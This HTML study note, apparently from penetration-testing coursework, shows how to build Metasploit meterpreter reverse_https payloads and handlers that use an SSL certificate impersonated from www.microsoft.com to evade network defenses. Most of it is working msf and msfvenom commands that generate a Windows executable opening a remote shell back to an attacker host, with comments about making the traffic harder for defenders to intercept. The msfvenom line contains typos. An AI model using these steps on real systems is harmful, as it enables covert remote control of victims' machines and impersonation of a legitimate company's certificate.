<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>custom SSL certificate</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>custom SSL certificate</h1><br/>PREREQUISTE:<br />• It is not possible to try this method on a Vmware lab with VMs because is not possible see TLS(SSL) packets. <br /><br /><strong><h2>reverse_https with a custom SSL certificate</h2></strong><br />To better obfuscate/encrypt our traffic making it harder to detect, we can configure our own SSL certificate for our payload and handler.<br />This technique can be used in two ways:<br />• By getting an SSL certificate signed by CA (a genuine SSL certificate)<br />    We can purchase a genuine SSL certificate from an authorized seller or you can use services such as <span style="text-decoration:underline;">Let&#39;s Encrypt</span> to get a genuine SSL certificate for free<br />• By using someone else&#39;s SSL certificate (impersonation) ← WHAT WE WILL USE NOW<br /><br /><br /><strong>Default SSL certificate</strong><br />When we establish a meterpreter connection with<br />• <span style="color:#ff8700;">multi/handler</span> via msf on the attacker machine(server)<br />• <span style="color:#ff0000;">payload</span> created with msfvenom on the target(client)<br />and we monitor the traffic with wireshark and filter for ssl traffic specifically for the <span style="text-decoration:underline;">Server Hello</span> from the attacker machine(server)<br />    <div class="codebox"><div class="codebox">ssl.handshake.type&nbsp;==&nbsp;2</div></div> <br />    and we do “right click” → Follow → TCP Stream<br />    The packets(in ASCII format) contain <strong>SSL certificate informations</strong> and is passed to the client in clear text. <br />    This SSL certificate is randomly generated by metasploit(when we use default options) and can be likely be flagged as suspicious from the defenses<br />    <a href=""><img src="images/962-1.png" alt="images/962-1.png" /></a><br /><br /><strong>Custom SSL certificate</strong><br />To reduce the chances to be detected we can use the module <br /><div class="codebox"><div class="codebox">msf&gt;&nbsp;use&nbsp;auxiliary/gather/impersonate_ssl<br />msf&gt;&nbsp;set&nbsp;RHOST&nbsp;www.microsoft.com<br />msf&gt;&nbsp;set&nbsp;EXPIRATION&nbsp;&lt;expiration-date-in&nbsp;DD&nbsp;MM&nbsp;YYYY&nbsp;format&gt;<br />msf&gt;&nbsp;set&nbsp;ADD_CN&nbsp;*.microsoft.com</div></div><br />Essentially this module will request a copy of an SSL certificate from a site that we are choosing, than it will create a <span style="color:#00ff00;">private key (PEM|DER)</span> that we can use to configure our <span style="color:#ff0000;">payload</span> and the <span style="color:#ff8700;">handler</span>. This allow to impersonate someone else with the custom SSL certificate and can help to evade the defenses<br /><a href=""><img src="images/962-2.png" alt="images/962-2.png" /></a><br />Now we have to generate <span style="color:#ff0000;">payload</span><br />We can do that by using:<br />• metasploit<br />    <div class="codebox"><div class="codebox">msf&gt;&nbsp;use&nbsp;payload/windows/meterpreter/reverse_https<br />msf&gt;&nbsp;set&nbsp;LHOST&nbsp;&lt;AttackerIP&gt;<br />msf&gt;&nbsp;set&nbsp;LPORT&nbsp;8443<br />msf&gt;&nbsp;set&nbsp;handlersslcert&nbsp;/root/.msf4/loot/20201031135026_default_92.122.145.53_92.122.145.53_pe_210718.pem<br />msf&gt;&nbsp;set&nbsp;stagerverifysslcert&nbsp;true&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#so&nbsp;will&nbsp;be&nbsp;more&nbsp;difficult&nbsp;for&nbsp;defenders&nbsp;to&nbsp;intercept&nbsp;our&nbsp;SSL&nbsp;traffic<br />msf&gt;&nbsp;generate&nbsp;-f&nbsp;exe&nbsp;-o&nbsp;/home/kali/Desktop/customPayload.exe</div></div><br />• msfvenom<br />    <div class="codebox"><div class="codebox">msfvenom&nbsp;-p&nbsp;windows/memeterpreter/reverse_https&nbsp;lhost=&lt;AttackerIP&gt;&nbsp;port=443&nbsp;handlersslcert=&lt;pem-file&gt;&nbsp;stagerverifysslcert=true&nbsp;-f&nbsp;exe&nbsp;-o&nbsp;<span style="color:#000000;font-weight:400">&lt;</span>output-file<span style="color:#000000;font-weight:400">&gt;</span></div></div><br />Now we have to setup the <span style="color:#ff8700;">handler</span> with the same SSL options<br /><div class="codebox"><div class="codebox">msf&gt;&nbsp;use&nbsp;multi/handler<br />msf&gt;&nbsp;set&nbsp;LHOST&nbsp;&lt;AttackerIP&gt;<br />msf&gt;&nbsp;set&nbsp;LPORT&nbsp;8443<br />msf&gt;&nbsp;set&nbsp;handlersslcert&nbsp;/root/.msf4/loot/20201031135026_default_92.122.145.53_92.122.145.53_pe_210718.pem<br />msf&gt;&nbsp;set&nbsp;stagerverifysslcert&nbsp;true&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#so&nbsp;will&nbsp;be&nbsp;more&nbsp;difficult&nbsp;for&nbsp;defenders&nbsp;to&nbsp;intercept&nbsp;our&nbsp;SSL&nbsp;traffic<br />msf&gt;&nbsp;set&nbsp;payload&nbsp;windows/meterpreter/reverse_https<br />msf&gt;&nbsp;exploit&nbsp;-j&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#background</div></div><br />Now when we intercept the traffic with wireshark we will we in the SSL certificate informations from the Server(our attacker machine) this<br />    <div class="codebox"><div class="codebox">ssl.handshake.type&nbsp;==&nbsp;2</div></div><br />    <a href="file://C:/CherryTree/screenshots2/PTP-elearnsecurity/2. Network Security/6. Post Exploitation/custom_ssl_certificate.png"><img src="images/962-3.png" alt="images/962-3.png" /></a><br />    “right click” → Follow → TCP Stream<br />    <a href=""><img src="images/962-4.png" alt="images/962-4.png" /></a><br /><br /><strong><span style="color:#ff0000;">WARNING:</span></strong><br />OpenSSL is been updated and changed the following option <code>CipherString=DEFAULT@SECLEVEL=2</code> in /etc/ssl/openssl.cnf<br />This can sometimes completely break the reverse_https payloads disabling to use <strong>HandlerSSLCert</strong> option.<br />To resolve that we can simply change back the <code>CipherString</code> parameter to DEFAULT<br /><div class="codebox"><div class="codebox">gedit&nbsp;&nbsp;/etc/ssl/openssl.cnf</div></div><br /><code>CipherString=DEFAULT</code><br /></div>
</body>
</html>
